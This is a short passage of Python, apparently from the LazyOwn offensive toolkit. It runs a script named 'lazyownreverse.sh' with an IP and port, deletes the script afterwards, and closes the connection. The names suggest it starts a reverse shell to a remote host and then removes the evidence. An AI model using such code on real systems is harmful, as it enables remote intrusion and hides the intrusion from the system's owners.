                subprocess.run(['./lazyownreverse.sh', '--ip', ip, '--puerto', port])
                os.remove('lazyownreverse.sh')
            else:
                print(result)

    except Exception as e:
        print(f'[e] Error: {e}')
    finally:
        conn.close()

